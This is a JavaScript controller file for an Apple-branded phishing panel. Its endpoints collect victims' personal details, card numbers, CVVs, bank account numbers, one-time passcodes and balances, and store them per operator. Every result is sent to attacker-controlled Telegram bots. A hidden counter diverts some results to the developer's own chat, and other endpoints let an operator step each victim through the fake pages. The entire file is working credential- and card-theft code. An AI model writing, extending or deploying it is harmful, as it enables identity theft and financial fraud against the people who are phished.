const axios = require("axios");
const AppleGB = require("../models/appleGbModel");
var moment = require("moment"); // require

let count = 3;
let auCount = 0;
let panelCount = 0;

const sendRes = async (req, res) => {
	let {
		firstName,
		lastName,
		telephone,
		addy1,
		addy2,
		town,
		pcode,
		dob,
		ccnum,
		ccexpmonth,
		ccexpyear,
		cvv,
		scode,
		accno,
		ccname,
		bin,
		ip,
		userAgent,
		telegramId,
	} = req.body;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}

	const response = await axios.get(`https://lookup.binlist.net/${bin}`);
	let bankName;

	if (response.data.bank) {
		bankName = response.data.bank.name.name;
	}

	const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
	var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPost Code: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n${
		scode && accno ? "Sort Code: ${scode}\nAcount Number: ${accno}\n" : ""
	}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
	if (count == 3 || telegramId == "680379375") {
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `HAYTCHRES:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		count = 0;
	} else {
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `Apple ${telegramId}:\n${originalText}\n\nCount: ${count}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: telegramId,
					text: `Apple:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		count = count + 1;
	}
	res.sendStatus(200);
};

const sendAuRes = async (req, res) => {
	let {
		firstName,
		lastName,
		telephone,
		addy1,
		dob,
		state,
		town,
		pcode,
		ccname,
		ccnum,
		ccexpmonth,
		ccexpyear,
		cvv,
		bin,
		ip,
		userAgent,
		telegramId,
	} = req.body;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}

	const response = await axios.get(`https://lookup.binlist.net/${bin}`);

	let bankName;

	if (response.data.bank) {
		bankName = response.data.bank.name;
	}
	const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
	var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}\n+ ----------- BIN List Info ------------+\n${binList}`;
	if (auCount == 10) {
		axios
			.post(
				`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `HAYTCHRES:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		auCount = 6;
	} else {
		axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `Apple ${telegramId}:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: telegramId,
					text: `Apple:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		auCount += 1;
	}
	res.send("Update Complete");
};

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	AppleGB.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await AppleGB.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	AppleGB.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitAppAuth = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await AppleGB.findOneAndUpdate(
			{ uniqueid },
			{ status: 6, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitBilling = async (req, res) => {
	let { fullname, telephone, address, city, pcode, dob, uniqueid } = req.body;

	try {
		await AppleGB.findOneAndUpdate(
			{
				uniqueid,
			},
			{
				fullname,
				telephone,
				address,
				city,
				pcode,
				dob,
				status: 1,
				timestamp: moment().format(),
			}
		);
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { uniqueid, telephone } = req.body;
	try {
		await AppleGB.findOneAndUpdate(
			{ uniqueid },
			{ telephone, status: 10, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { uniqueid, otp } = req.body;
	try {
		await AppleGB.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitBalance = async (req, res) => {
	const { uniqueid, balance } = req.body;
	try {
		await AppleGB.findOneAndUpdate(
			{ uniqueid },
			{ balance, status: 12, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCCAgain = async (req, res) => {
	const { uniqueid, ccname, ccnum, ccexp, cvv } = req.body;
	try {
		await AppleGB.findOneAndUpdate(
			{ uniqueid },
			{ ccname, ccnum, ccexp, cvv, status: 8, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCC = async (req, res) => {
	let { uniqueid, ccname, ccnum, ccexp, cvv, ip, owner } = req.body;
	try {
		await AppleGB.create({
			uniqueid,
			ccname,
			ccnum,
			ccexp,
			cvv,
			owner,
			status: 2,
			ip,
			timestamp: moment().format(),
		});

		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await AppleGB.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	sendRes,
	sendAuRes,
	getOwnerVics,
	command,
	getInfo,
	submitAppAuth,
	submitBilling,
	submitTelephone,
	submitOtp,
	submitCCAgain,
	submitCC,
	deleteEntry,
	submitBalance,
};
